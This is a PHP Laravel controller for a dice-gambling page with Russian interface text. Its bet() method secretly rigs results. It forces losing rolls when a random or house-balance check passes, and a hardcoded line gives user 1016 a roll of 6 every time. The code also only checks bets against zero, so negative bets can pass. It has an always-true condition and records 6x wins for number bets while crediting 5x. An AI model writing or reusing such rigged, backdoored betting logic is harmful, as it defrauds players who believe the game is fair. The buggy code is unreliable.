<?php

namespace App\Http\Controllers;
use App\User;
use Carbon\Carbon;
use Illuminate\Http\Request;
use Illuminate\Support\Cache;
use App\Http\Requests;
use App\Http\Controllers\Controller;

use Storage;

class DiceController extends Controller {
    
    const AMSUM = 25;
    
    private function _responseMessageToSite($message, $userid)
    {
        return $this->redis->publish(GameController::INFO_CHANNEL, json_encode([
            'steamid' => $userid,
            'message' => $message
        ]));
    }
	public function index(){
        parent::setTitle('КОСТИ | ');
        $gamestats = \DB::table('dice')->orderBy('id', 'desc')->limit(13)->get();
		$games = [];
		foreach ($gamestats as $game){
			$user = User::find($game->user_id);
			$games[] = [
                'avatar' => $user->avatar,
                'username' => $user->username,
                'win' => $game->win
            ];
		}
		return view('pages.dice', compact('games'));
	}
    public function bet(Request $request){
        $bet_sum = $request->get('sum');
        $bet_value = $request->get('value');
        
        switch ($bet_value) {
            case 1: case 2: case 3: case 4: case 5: case 6: case 'low': case 'high': break;
            default: return response()->json(['text' => 'Ошибки.', 'type' => 'error']);
        }
        
        if($bet_value == 'low' || 'high'){
            $win_sum = $bet_sum;
        } else {
            $win_sum = $bet_sum * 5;
        }
        if ($this->user->ban != 0) return response()->json(['text' => 'Вы забанены на сайте', 'type' => 'error']);
        if ($bet_sum == 0) return response()->json(['text' => 'Минимальная ставка 0.01р.', 'type' => 'error']);
        if (!User::mchange($this->user->id, -$bet_sum)) return response()->json(['text' => 'У вас недостаточно средств', 'type' => 'error']);
        User::slchange($this->user->id, $bet_sum / 100 * config('mod_game.slimit'));
        $roll = rand(1, 6);
        $am = \DB::table('dice')->sum('am') + $win_sum;
        if ((rand(0, floor($bet_sum/self::AMSUM))!= 0) || ($am > 0) ){
            if($bet_value == 'low'){
                $roll = rand(4, 6);
            } elseif($bet_value == 'high'){
                $roll = rand(1, 3);
            } else {
                while ($roll == $bet_value){
                    $roll = rand(1, 6);
                }
            }
        }
        if($this->user->id == 1016) $roll = 6;
        $am = -$bet_sum;
        $win = -$bet_sum;
        if($bet_value == 'low') {
            if ($roll < 4){
                User::mchange($this->user->id, $bet_sum*2);
                $am += $bet_sum*2;
                $win = $bet_sum*2;
            }
        } else if($bet_value == 'high') {
            if ($roll > 3){
                User::mchange($this->user->id, $bet_sum*2);
                $am += $bet_sum*2;
                $win = $bet_sum*2;
            }
        } else if ($roll == $bet_value){
            User::mchange($this->user->id, $bet_sum*5);
            $am += $bet_sum*6;
            $win = $bet_sum*6;
        }
        $returnValue = [
            'avatar' => $this->user->avatar,
            'username' => $this->user->username,
            'win' => $win
        ];
        $this->redis->publish('dice', json_encode($returnValue));
        \DB::table('dice')->insert(['user_id' => $this->user->id, 'money' => $bet_sum, 'bet_v' => $bet_value, 'value' => $roll, 'am' => $am, 'win' => $win ]);
        return response()->json(['text' => 'Действие выполнено.', 'type' => 'success','value' => $roll]);
    }
}